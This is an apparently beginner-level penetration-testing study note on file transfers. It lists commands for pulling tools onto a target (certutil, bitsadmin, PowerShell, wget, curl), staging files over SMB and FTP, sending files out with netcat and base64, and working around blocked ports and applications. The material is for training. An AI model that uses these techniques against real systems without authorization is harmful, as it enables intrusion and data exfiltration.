---
tags: [module/file-transfers, file-transfer, windows, linux, download, upload, evasion, level/beginner]
---

# File Transfers - Beginner's Guide

## Why File Transfers Matter in Pentesting

During a penetration test, you'll often need to move files to or from a target system:

- Upload tools to enumerate the system
- Download proof-of-concept files
- Transfer privilege escalation binaries
- Exfiltrate sensitive data
- Upload web shells or reverse shells

**The Rule:** If you can't move files, you can't do much.

---

## The Challenge: Things That Block File Transfers

| Obstacle | What It Does |
|----------|--------------|
| Application Control Policy | Blocks PowerShell, exe files |
| Antivirus/EDR | Detects and deletes malicious files |
| Firewall | Blocks specific ports |
| Web Content Filtering | Blocks GitHub, Dropbox, Google Drive |
| Network Monitoring | Alerts on unusual traffic |

---

## Real-World Scenario

You gain RCE on an IIS web server via unrestricted file upload.

**What happens next:**

1. Upload web shell ✅
2. Get reverse shell ✅
3. Try PowerShell to download PowerUp.ps1 ❌ (PowerShell blocked)
4. Manual enum finds SeImpersonatePrivilege (good for PrintSpoofer)
5. Try Certutil to download from GitHub ❌ (web filtering blocks)
6. Try FTP ❌ (port 21 blocked by firewall)
7. Try SMB with Impacket ✅ (port 445 allowed)
8. Success! Escalate to admin

**The Lesson:** You need MULTIPLE file transfer methods. One WILL fail.

---

## File Transfer Methods Overview

| Method | Windows | Linux | Port | Common Use |
|--------|---------|-------|------|------------|
| PowerShell | ✅ | ❌ | Any | Scripts, exes |
| Certutil | ✅ | ❌ | 80/443 | Small files |
| wget | ✅* | ✅ | 80/443 | General download |
| curl | ✅* | ✅ | 80/443 | General transfer |
| SMB | ✅ | ✅ | 445 | Large files |
| FTP | ✅ | ✅ | 21 | Legacy |
| SCP | ✅* | ✅ | 22 | Secure transfer |
| Netcat | ✅ | ✅ | Any | Raw data |
| Base64 | ✅ | ✅ | N/A | Text-only channels |

*May need installation

---

## Key Concepts

### Download vs Upload

- **Download:** Get file FROM target TO your machine
- **Upload:** Send file FROM your machine TO target

### Inbound vs Outbound

- **Inbound:** Target initiates connection to you (you listen)
- **Outbound:** You initiate connection to target (target listens)

### Blocked vs Allowed

- Some ports will be blocked (21, 445, etc.)
- Some protocols will be blocked (HTTP, FTP, etc.)
- Some applications will be blocked (PowerShell, certutil)
- Some domains will be blocked (GitHub, Dropbox)

**The Rule:** Always try multiple methods. What works in one environment may fail in another.

---

## HTTP/HTTPS Transfers

### Windows: PowerShell

# Download file
Invoke-WebRequest -Uri "http://your-server/file.exe" -OutFile "C:\temp\file.exe"

# Short version
iwr -uri "http://your-server/file.exe" -OutFile file.exe

### Windows: Certutil

certutil -urlcache -f http://your-server/file.exe file.exe

### Windows: Bitsadmin

bitsadmin /transfer job /download /priority high http://your-server/file.exe C:\temp\file.exe

### Linux: wget

wget http://your-server/file -O /tmp/file

### Linux: curl

curl -o /tmp/file http://your-server/file

---

## SMB Transfers

### Setting Up SMB Server (Linux)

# Using Impacket smbserver
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /path/to/files

# Mount on Windows
copy \\YOUR-IP\share\file.exe C:\temp\file.exe

### Why SMB Works

- Often allowed through firewalls (port 445)
- Native to Windows
- Can be less monitored than HTTP

---

## FTP Transfers

### Setting Up FTP Server (Linux)

# Install vsftpd
sudo apt install vsftpd -y
sudo systemctl start vsftpd

### FTP from Windows

ftp YOUR-IP
> get file.exe
> put data.txt

### FTP from Linux

ftp YOUR-IP
wget ftp://YOUR-IP/file

---

## SCP/SSH Transfers

### Download from Target (Linux)

scp user@target:/path/to/file /local/path/

### Upload to Target (Linux)

scp /local/file user@target:/remote/path/

### Windows (needs additional tools)

- WinSCP
- pscp (PuTTY)
- OpenSSH client (Windows 10+)

---

## Netcat Transfers

### Sending File (Sender)

nc -lvnp 4444 < file

### Receiving File (Receiver)

nc -v TARGET-IP 4444 > file

### With Progress

# Sender
tar cf - /path/to/dir | nc -lvnp 4444

# Receiver
nc -v TARGET-IP 4444 | tar xf -

---

## Base64 Encoding

Useful when only text channels are available (like command injection).

### Encode File (Linux)

base64 file -w 0

### Decode (Linux)

echo "base64string" | base64 -d > file

### Decode (Windows)

certutil -decode encoded.txt file.exe

---

## Key Takeaways

- Always have multiple transfer methods ready
- Test what's allowed (ports, protocols, apps)
- SMB often works when HTTP doesn't
- Base64 works when binary transfers fail
- Know both download AND upload techniques
- Document what worked for future reference
- The more methods you know, the less likely you'll get stuck
- Real-world example: PowerShell blocked, FTP blocked, but SMB saved the day
- Practice ALL these methods in the lab
- File transfer is a core skill - master it
